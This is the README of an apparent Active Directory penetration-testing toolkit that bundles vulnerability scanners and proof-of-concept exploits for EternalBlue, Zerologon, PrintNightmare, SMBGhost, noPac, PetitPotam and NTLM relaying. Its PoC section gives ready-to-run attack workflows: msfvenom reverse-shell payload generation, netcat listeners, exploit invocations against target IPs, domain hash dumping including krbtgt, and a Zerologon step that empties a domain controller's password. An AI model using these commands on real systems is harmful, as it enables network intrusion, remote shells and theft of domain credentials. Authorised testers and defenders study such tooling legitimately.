## 📗 Table of contents
* [📖 About the project](#about-the-project)
* [🛠 Installation](#installation)
* [💻 Getting started](#getting-started)
	* [Usage of scanners](#usage-scanners)
	* [Structure of the project](#structure-project)
* [🔭 Roadmap](#roadmap)
* [👥 Contact](#contact)
* [🤝 Contributing](#contributing)
* [🙏 Acknowledgments](#acknowledgments)

**[ATTENTION]** The script provided is for educational and informational purposes only, I am not responsible of any actions that you could take with it.

## 📖 About the project <a name="about-the-project"/>
During a penetration test on an Active Directory (AD) infrastructure, it often hapens to exploit CVE and for this, we must check if it's vulnerable, and re-find the PoC tool. Thus, to avoid loosing time, the scanner and PoC utilities are stored into one toolkit.

The toolkit is mainly used for another project where the first version was scripted in Bash and is available on:  https://github.com/MizaruIT/PENTADAY_BASH. The 2nd version is available in Python (easier to use: https://github.com/MizaruIT/PENTADAY). It is an automation script for searching vulnerabilities on Active Directory.

## 🛠 Installation <a name="installation"/>
**I) Command per command**
1) Clone the repository
```sh
git clone https://github.com/MizaruIT/PENTAD-TOOLKIT;
cd PENTAD-TOOLKIT;
```
2) Install the required dependencies
```sh
pip3 install -r requirements-pip3.txt;
pip2 install -r requirements-pip2.txt;
bash requirements_linux.txt
```

3) **(Optional)** To use the scanners and PoC from everywhere, just run the following command
```sh
sudo ln -sf $(pwd)/bluegate_cve20200610_poc.py bluegate_cve20200610_poc
sudo ln -sf $(pwd)/eternalblue_ms17010_poc.py eternalblue_ms17010_poc
sudo ln -sf $(pwd)/netapi_cve20084250_poc.py netapi_cve20084250_poc
sudo ln -sf $(pwd)/ntlmrelayx.py ntlmrelayx
sudo ln -sf $(pwd)/petitpotam_poc.py petitpotam_poc
sudo ln -sf $(pwd)/printnightmare_cve20211675_poc.py printnightmare_cve20211675_poc
sudo ln -sf $(pwd)/sAMAccountName_cve202142278_poc.py sAMAccountName_cve202142278_poc
sudo ln -sf $(pwd)/smbghost_cve20200796_poc.py smbghost_cve20200796_poc
sudo ln -sf $(pwd)/zerologon_cve20201472_poc.py zerologon_cve20201472_poc
sudo ln -sf $(pwd)/bluegate_cve20200610_scanner.py bluegate_cve20200610_scanner
sudo ln -sf $(pwd)/eternalblue_ms17010_scanner.py eternalblue_ms17010_scanner
sudo ln -sf $(pwd)/getgppcreds_scanner.py getgppcreds_scanner
sudo ln -sf $(pwd)/micRA_cve20191040_scanner.py micRA_cve20191040_scanner
sudo ln -sf $(pwd)/netapi_cve20084250_scanner.py netapi_cve20084250_scanner
sudo ln -sf $(pwd)/petitpotam_scanner.py petitpotam_scanner
sudo ln -sf $(pwd)/printnightmare_cve20211675_scanner.py printnightmare_cve20211675_scanner
sudo ln -sf $(pwd)/rpcdump_scanner.py rpcdump_scanner
sudo ln -sf $(pwd)/sAMAccountName_cve202142278_scanner.py sAMAccountName_cve202142278_scanner
sudo ln -sf $(pwd)/smbghost_cve20200796_scanner.py smbghost_cve20200796_scanner
sudo ln -sf $(pwd)/smbleed_cve20201206_scanner.py smbleed_cve20201206_scanner
sudo ln -sf $(pwd)/smbsigning_scanner.py smbsigning_scanner
sudo ln -sf $(pwd)/zerologon_cve20201472_scanner.py zerologon_cve20201472_scanner
```
**II) All commands in one (copy/paste)**
```sh
git clone https://github.com/MizaruIT/PENTAD-TOOLKIT;
cd PENTAD-TOOLKIT;
pip3 install -r requirements.txt;
bash requirements_linux.txt
sudo ln -sf $(pwd)/bluegate_cve20200610_poc.py bluegate_cve20200610_poc
sudo ln -sf $(pwd)/eternalblue_ms17010_poc.py eternalblue_ms17010_poc
sudo ln -sf $(pwd)/netapi_cve20084250_poc.py netapi_cve20084250_poc
sudo ln -sf $(pwd)/ntlmrelayx.py ntlmrelayx
sudo ln -sf $(pwd)/petitpotam_poc.py petitpotam_poc
sudo ln -sf $(pwd)/printnightmare_cve20211675_poc.py printnightmare_cve20211675_poc
sudo ln -sf $(pwd)/sAMAccountName_cve202142278_poc.py sAMAccountName_cve202142278_poc
sudo ln -sf $(pwd)/smbghost_cve20200796_poc.py smbghost_cve20200796_poc
sudo ln -sf $(pwd)/zerologon_cve20201472_poc.py zerologon_cve20201472_poc
sudo ln -sf $(pwd)/bluegate_cve20200610_scanner.py bluegate_cve20200610_scanner
sudo ln -sf $(pwd)/eternalblue_ms17010_scanner.py eternalblue_ms17010_scanner
sudo ln -sf $(pwd)/getgppcreds_scanner.py getgppcreds_scanner
sudo ln -sf $(pwd)/micRA_cve20191040_scanner.py micRA_cve20191040_scanner
sudo ln -sf $(pwd)/netapi_cve20084250_scanner.py netapi_cve20084250_scanner
sudo ln -sf $(pwd)/petitpotam_scanner.py petitpotam_scanner
sudo ln -sf $(pwd)/printnightmare_cve20211675_scanner.py printnightmare_cve20211675_scanner
sudo ln -sf $(pwd)/rpcdump_scanner.py rpcdump_scanner
sudo ln -sf $(pwd)/sAMAccountName_cve202142278_scanner.py sAMAccountName_cve202142278_scanner
sudo ln -sf $(pwd)/smbghost_cve20200796_scanner.py smbghost_cve20200796_scanner
sudo ln -sf $(pwd)/smbleed_cve20201206_scanner.py smbleed_cve20201206_scanner
sudo ln -sf $(pwd)/smbsigning_scanner.py smbsigning_scanner
sudo ln -sf $(pwd)/zerologon_cve20201472_scanner.py zerologon_cve20201472_scanner
```

## 💻 Getting started <a name="getting-started"/>
The script can be used via Python import (ex: import SCANNER.bluegate_cve20200610_poc) or via CLI.
### Usage of scanners tools <a name="usage-scanners"/>
**[ALL SCANNERS USAGE ARE DETAILED INTO SCANNER/00.LIST_SCANNER_GITHUB.txt]**

1) BlueGate (CVE-20200610) 
```sh 
python3 SCANNER/bluegate_cve20200610_scanner.py  -h
usage: bluegate_cve20200610_scanner.py [-h] -M {check} [-P PORT] host

positional arguments:
  host                  IP address of host

options:
  -h, --help            show this help message and exit
  -M {check}, --mode {check}
                        Mode
  -P PORT, --port PORT  UDP port of RDG, default: 3391

example(s): 
python3 SCANNER/bluegate_cve20200610_scanner.py -M check -P $PORT $IP
```

2) EternalBlue (or MS17-010) 
```sh 
python3 SCANNER/eternalblue_ms17010_scanner.py -h
usage: eternalblue_ms17010_scanner.py [-h] [-target-ip ip address] [-port [destination port]] target

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit

connection:
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

example(s): 
python3 SCANNER/eternalblue_ms17010_scanner.py -p "$TARGET_PORT" "$TARGET_IP" 
python3 SCANNER/eternalblue_ms17010_scanner.py -p "$TARGET_PORT" "$DOMAIN_NAME"/"$DOMAIN_USERNAME":"$DOMAIN_PWD"@"$TARGET_IP"
```

3) GPP Abuse 
```sh
python3 SCANNER/getgppcreds_scanner.py  -h
usage: getgppcreds_scanner.py [-h] [-share SHARE] [-base-dir BASE_DIR] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address]
                              [-port [destination port]]
                              target

Group Policy Preferences passwords finder and decryptor

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -share SHARE          SMB Share
  -base-dir BASE_DIR    Directory to search in (Default: /)
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              dont ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

example(s):
- python3 getgppcreds_scanner.py "$USERNAME"@"$DC_IP" 
- python3 getgppcreds_scanner.py "$DOMAIN_NAME"/"$USERNAME"@"$DC_IP" -hashes "$NTLM_HASH"
```

4) MIC Remove Attack (or CVE-2019-1040)
```sh
python3 SCANNER/micRA_cve20191040_scanner.py -h
usage: micRA_cve20191040_scanner.py [-h] [-port [destination port]] [-hashes LMHASH:NTHASH] target

CVE-2019-1040 scanner - Connects over SMB and attempts to authenticate with invalid NTLM packets. If accepted, target is vulnerable to MIC remove attack

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit

connection:
  -port [destination port]
                        Destination port to connect to SMB Server

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

example(s):
- python3 micRA_cve20191040_scanner.py -port "$PORT" "$DOMAIN_NAME"/"$USERNAME":"$PASSWORD"@"$TARGET_IP"
```

5) NetApi (or CVE-20084250)
```sh
python3 SCANNER/netapi_cve20084250_scanner.py -h
Usage: SCANNER/netapi_cve20084250_scanner.py target_ip port

example(s):
- python3 netapi_cve20084250_scanner.py "$TARGET_IP" "$PORT"
```

6) PetitPotam
```sh
python3 SCANNER/petitpotam_scanner.py 
Usage: SCANNER/petitpotam_scanner.py target_ip port domain username password ntlmhash

example(s):
- python3 petitpotam_scanner.py "$TARGET_IP" "$TARGET_PORT" "$domain_name" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
```

7) PrintNightmare (or CVE-2021-1675)
```sh
python3 SCANNER/printnightmare_cve20211675_scanner.py  -h
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: printnightmare_cve20211675_scanner.py [-h] [-debug] [-port [destination port]] [-target-ip ip address] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-dc-ip ip address] [-name driver name]
                                             [-env driver name] [-path driver path] [-dll driver dll] [-check] [-list] [-delete]
                                             target

PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -no-pass              dont ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

connection:
  -port [destination port]
                        Destination port to connect to MS-RPRN named pipe
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

driver:
  -name driver name     Name for driver
  -env driver name      Environment for driver
  -path driver path     Driver path for driver
  -dll driver dll       Path to DLL

modes:
  -check                Check if target is vulnerable
  -list                 List existing printer drivers
  -delete               Deletes printer driver

example(s):
- python3 printnightmare_cve20211675_scanner.py -check "$USERNAME":"$PASSWORD"@"$TARGET_IP"
- python3 printnightmare_cve20211675_scanner.py -check "$USERNAME"@"$TARGET_IP" -hashes "$NTLM_HASH"
```
8) PrintSpooler 
```sh
python3 SCANNER/rpcdump_scanner.py -h
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: rpcdump_scanner.py [-h] [-debug] [-target-ip ip address] [-port [destination port]] [-hashes LMHASH:NTHASH] target

Dumps the remote RPC enpoints information via epmapper.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

connection:
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to RPC Endpoint Mapper

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

example(s):


```

9) sAMAccountName (or CVE-2021-42278)
```sh
python3 SCANNER/sAMAccountName_cve202142278_scanner.py 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: sAMAccountName_cve202142278_scanner.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug]
                                              [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local] [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass]
                                              [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
                                              [domain/]username[:password]

Pachine - CVE-2021-42278 Scanner & Exploit

positional arguments:
  [domain/]username[:password]
                        Account used to authenticate to DC.

options:
  -h, --help            show this help message and exit
  -scan                 Scan the DC
  -spn SPN              SPN (service/server) of the target service the service ticket will be generated for
  -impersonate IMPERSONATE
                        target username that will be impersonated (through S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for
                        delegation to the SPN specified
  -domain-netbios NETBIOSNAME
                        Domain NetBIOS name. Required if the DC has multiple domains.
  -computer-name NEW-COMPUTER-NAME$
                        Name of new computer. If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
  -computer-pass password
                        Password to set to computer. If omitted, a random [A-Za-z0-9]{32} will be used.
  -debug                Turn DEBUG output ON
  -method {SAMR,LDAPS}  Method of adding the computer. SAMR works over SMB. LDAPS has some certificate requirements and isnt always available.
  -port {139,445,636}   Destination port to connect to. SAMR defaults to 445, LDAPS to 636.

LDAP:
  -baseDN DC=test,DC=local
                        Set baseDN for LDAP. If ommited, the domain part (FQDN) specified in the account parameter will be used.
  -computer-group CN=Computers,DC=test,DC=local
                        Group to which the account will be added. If omitted, CN=Computers will be used,

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              dont ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-host hostname     FQDN of the domain controller to target.
  -dc-ip ip             IP of the domain controller to use. Useful if you cant translate the FQDN.specified in the account parameter will be used

example(s):
- python3 sAMAccountName_cve202142278_scanner.py -dc-host "$DC_HOSTNAME" -scan "$DOMAIN_NAME"/"$USERNAME":"$PASSWORD"
- python3 sAMAccountName_cve-2021-42278_scanner.py -dc-host "$DC_HOSTNAME" -scan "$DOMAIN_NAME"/"$USERNAME" -hashes "$NTLM_HASH"
```

10) SMBGhost (or CVE-2020-0796)
```sh
python3 SCANNER/smbghost_cve20200796_scanner.py -h
Usage: SCANNER/smbghost_cve20200796_scanner.py target_ip port

example(s):
- python3 smbghost_cve20200796_scanner.py $TARGET_IP $PORT 
```

11) SMBleed (or CVE-2020-1206)
```sh
python3 SCANNER/smbleed_cve20201206_scanner.py -h
Usage: SCANNER/smbleed_cve20201206_scanner.py target_ip port

example(s):
- python3 smbleed_cve20201206_scanner.py $TARGET_IP $PORT 
```

12) SMB Signing 
```sh
python3 SCANNER/smbsigning_scanner.py -h
Usage: SCANNER/smbsigning_scanner.py target_ip port

example(s):
- python3 smbsigning_scanner.py $TARGET_IP $PORT
```

13) Zerologon (or CVE-2020-1472)
```sh
python3 SCANNER/zerologon_cve20201472_scanner.py -h
Usage: zerologon_tester.py <dc-name> <dc-ip>

Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.
Note: dc-name should be the (NetBIOS) computer name of the domain controller.

example(s):
- python3 zerologon_cve20201472_scanner.py "$DC_HOSTNAME" "$DC_IP"
```


### Usage of PoC tools <a name="usage-poc"/>
**[ALL POC USAGE ARE DETAILED INTO POC/00.LIST_POC_GITHUB.txt]**

1) BlueGate (CVE-20200610) 
```sh 
python3 POC/bluegate_cve20200610_poc.py -h
usage: bluegate_cve20200610_poc.py [-h] -M {dos} [-P PORT] host

positional arguments:
  host                  IP address of host

options:
  -h, --help            show this help message and exit
  -M {dos}, --mode {dos}
                        Mode
  -P PORT, --port PORT  UDP port of RDG, default: 3391

example(s): 
- python3 bluegate_cve20200610.py -M dos -P $TARGET_PORT $TARGET_IP
```

2) EternalBlue (or MS17-010) 
```sh 
python3 POC/eternalblue_ms17010_poc.py 
POC/eternalblue_ms17010_poc.py <ip> <shellcode_file> [numGroomConn]
POC/eternalblue_ms17010_poc.py <ip> <shellcode_file> [numGroomConn] <username> <password>

example(s): 
1) Shellcode generation with your listening IP and PORT: https://gist.github.com/worawit/05105fce9e126ac9c85325f0b05d6501
2) Launch a listener (ex: netcat)
- netcat -lvnp $PORT
3) Execute the POC with the target and shellcode file path: 
- python3 eternalblue_ms17010_poc.py $TARGET_IP $FILEPATH 13 
```

3) GPP Abuse 
```sh
[SAME SCRIPT AS SCANNER/]
example(s):
- python3 getgppcreds_scanner.py "$USERNAME"@"$DC_IP" (without password ex: for guest) or 
- python3 getgppcreds_scanner.py "$DOMAIN_NAME"/"$USERNAME":"$PASSWORD"@"$DC_IP"
```

4) MIC Remove Attack (or CVE-2019-1040)
```sh
[STILL NOT IMPLEMENTED]
example(s):
- python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip  --just-dc-user krbtgt
- python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip --just-dc-user krbtgt
```


5) NetApi (or CVE-20084250)
```sh
example(s):
1) Generate the payload/shellcode with your listening IP and PORT
2) Launch a listener (ex: netcat)
- netcat -lvnp $PORT
3) Execute the POC with the target IP, the shellcode file path, the targeted OS: 
- python3 netapi_cve20191040_poc.py $TARGET_IP $OS $PORT $FILEPATH
```
6) PetitPotam
```sh
python3 POC/petitpotam_poc.py -h
usage: petitpotam_poc.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-no-pass] [-k] [-dc-ip ip address] [-target-ip ip address] [-pipe {efsr,lsarpc,samr,netlogon,lsass,all}]
                         listener target

PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()

positional arguments:
  listener              ip address or hostname of listener
  target                ip address or hostname of target

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        valid username
  -p PASSWORD, --password PASSWORD
                        valid password (if omitted, it will be asked unless -no-pass)
  -d DOMAIN, --domain DOMAIN
                        valid domain name
  -hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  -no-pass              dont ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve
                        it
  -pipe {efsr,lsarpc,samr,netlogon,lsass,all}
                        Named pipe to use (default: lsarpc) or all

example(s):
- Responder.py -I $INTERFACE --lm 
- python3 PetitPotam.py $LISTENERIP $TARGETIP $USERNAME $PASSWORD
```
7) PrintNightmare (or CVE-2021-1675)
```sh
python3 POC/printnightmare_cve20211675_poc.py -h
PrintNightmare Exploit

options:
  -h, --help            show this help message and exit
  -v                    Enable verbose logging from SMB server
  -t TIMEOUT            Connection timeout

Authentication:
  -u USERNAME           Set username
  -H HASH, -hashes HASH
                        Use Hash for authentication
  -p PASSWORD           Set password
  -d DOMAIN             Set domain
  --local-auth          Authenticate to target host, no domain

DLL Execution:
  -dll DLL              Local DLL file to execute
  --remote-dll REMOTE_DLL
                        Remote dll "\\192.168.1.25\Share\beacon.dll"
  -share SHARE          Set local SMB share name
  --local-ip LOCAL_IP   Set local IP (defaults to primary interface)

Target(s):
  -pDriverPath PDRIVERPATH
                        Driver path. Example 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'
  target                192.168.2.2, target.txt, 10.0.0.0/24
  -port [destination port]
                        Destination port to connect to SMB Server
  -proto {MS-RPRN,MS-PAR}
                        Target protocol (Default=MS-RPRN)

example(s):
1) Generate a payload: 
- msfvenom -p windows_reverse_tcp_shell LHOST=$L_IP -f dll -o shellcode_printnightmare.dll
- x86_64-w64-mingw32-gcc -shared -o shellcode_printnightmare shellcode_printnightmare.c
2) Launch a listener (ex: netcat)
- netcat -lvnp $PORT
3) Execute the POC with your credentials and via a DLL: 
- python3 CVE-2021-1675.py -v -u $USERNAME -p $PASSWORD -d $DOMAIN -dll $NAME_DLL.dll --local-ip $MY_IP $TARGET_IP
```

8) PrintSpooler 
```sh

example(s):


```
9) sAMAccountName (or CVE-2021-42278)
```sh
python3 POC/sAMAccountName_cve202142278_poc.py -h
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: sAMAccountName_cve202142278_poc.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-outputfile OUTPUTFILE]
                                          [-use-vss] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-just-dc-user USERNAME] [-just-dc] [-just-dc-ntlm] [-pwd-last-set] [-user-status] [-history]
                                          [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                                          target

Performs various techniques to dump secrets from the remote machine without executing any agent there.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)

options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -system SYSTEM        SYSTEM hive to parse
  -bootkey BOOTKEY      bootkey for SYSTEM hive
  -security SECURITY    SECURITY hive to parse
  -sam SAM              SAM hive to parse
  -ntds NTDS            NTDS.DIT file to parse
  -resumefile RESUMEFILE
                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the sessions state
  -outputfile OUTPUTFILE
                        base output filename. Extensions will be added for sam, secrets, cached and ntds
  -use-vss              Use the VSS method insead of default DRSUAPI
  -exec-method [{smbexec,wmiexec,mmcexec}]
                        Remote exec method to use at target (only when using -use-vss). Default: smbexec

display options:
  -just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesnt apply to -outputfile data
  -user-status          Display whether or not the user is disabled
  -history              Dump password history, and LSA secrets OldVal

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              dont ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it

example(s):
1) Execute the POC on the targeted DC with your credentials: 
- python noPac.py $DOMAIN/$username:'$password' -dc-ip $DC_IP (to only export the admin ticket)
- python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump (to dump the hashes)
```

10) SMBGhost (or CVE-2020-0796)
```sh
python3 POC/smbghost_cve20200796_poc.py -h
usage: smbghost_cve20200796_poc.py [-h] -ip IP [-p PORT] -f FILEPATH

options:
  -h, --help            show this help message and exit
  -ip IP                IP address of target
  -p PORT, --port PORT  SMB port, default: 445
  -f FILEPATH, --filepath FILEPATH
                        Path to the payload file

example(s):
1) Generate the shellcode
- msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$OUR_IP LPORT=$OUR_LISTENING_PORT -f python "USER_PAYLOAD"
2) Launch a listener (ex: netcat)
- netcat -lvnp $PORT
3) Execute the POC
- python3 smbghost_cve20200796_poc.py -ip $TARGET_IP -p $TARGET_PORT -f $FILEPATH_TO_SHELLCODE
```

11) SMBleed (or CVE-2020-1206)
```sh

example(s):


```
12) SMB Signing 
```sh
python3 POC/ntlmrelayx.py -h
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w] [-i] [-ip INTERFACE_IP] [--no-smb-server] [--no-http-server] [--no-wcf-server] [--no-raw-server] [--smb-port SMB_PORT]
                     [--http-port HTTP_PORT] [--wcf-port WCF_PORT] [--raw-port RAW_PORT] [--no-multirelay] [-ra] [-r SMBSERVER] [-l LOOTDIR] [-of OUTPUT_FILE] [-codec CODEC] [-smb2support]
                     [-ntlmchallenge NTLMCHALLENGE] [-socks] [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6] [--remove-mic] [--serve-image SERVE_IMAGE] [-c COMMAND] [-e FILE] [--enum-local-admins]
                     [-rpc-mode {TSCH}] [-rpc-use-smb] [-auth-smb [domain/]username[:password]] [-hashes-smb LMHASH:NTHASH] [-rpc-smb-port {139,445}] [-q QUERY] [-machine-account MACHINE_ACCOUNT]
                     [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN] [-remove-target] [--no-dump] [--no-da] [--no-acl] [--no-validate-privs] [--escalate-user ESCALATE_USER]
                     [--add-computer [COMPUTERNAME [PASSWORD ...]]] [--delegate-access] [--sid] [--dump-laps] [--dump-gmsa] [--dump-adcs] [-k KEYWORD] [-m MAILBOX] [-a] [-im IMAP_MAX] [--adcs]
                     [--template TEMPLATE] [--altname ALTNAME] [--shadow-credentials] [--shadow-target SHADOW_TARGET] [--pfx-password PFX_PASSWORD] [--export-type {PEM, PFX}]
                     [--cert-outfile-path CERT_OUTFILE_PATH]

example(s):
1) To relay communication
- ntlmrelayx -tf smb_sign_disabled.txt -smb2support -socks
- responder -I $INTERFACE
2) To loot directly
- ntlmrelayx.py -t $IP -l loot
```

13) Zerologon (or CVE-2020-1472)
```sh
python3 POC/zerologon_cve20201472_poc.py -h
Usage: zerologon_tester.py <dc-name> <dc-ip>

Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.
Note: dc-name should be the (NetBIOS) computer name of the domain controller.

example(s):
1) Execute it on the DC IP/Hostname: 
- python3 zerologon_cve20201472_poc.py $DC_NAME $DC_IP
2) Restore password? [NOT IMPLEMENTED]
- Execute the restorepassword.py from the github repo
```

### Structure of the project <a name="structure-project"/>
The project has the following structure once it is cloned.

    └── $PATH_TO_WORKSPACE/	# THE ROOT OF YOUR ENVIRONMENT
		├── POC/	 		# The scripts for PoC of known vulnerabilities
		├── SCANNER/ 		# The scanners used to check if an IP, DC, etc. is vulnerable to a specific attack


## 🔭 ROADMAP <a name="roadmap"/>
- [ ] Add more scanners + POC


## 👥 Contact <a name="contact"/>
- Twitter: @MizaruIT (https://twitter.com/MizaruIT)
- GitHub: @MizaruIT (https://github.com/MizaruIT)
- Project Link: https://github.com/MizaruIT/PENTADAY_BASH

## 🤝 Contributing <a name="contributing"/>
Contributions, issues, and feature requests are welcome!

Feel free to send me messages to add new features (such as new vulnerabilities, new scan, etc.)

## 🙏 Acknowledgments <a name="acknowledgments"/>
The project uses different scripts from various sources (to do: quote the sources of some scripts).

Some links are listed into SCANNER/00.LIST_SCANNER_GITHUB.txt and POC/00.LIST_POCs_GITHUB.txt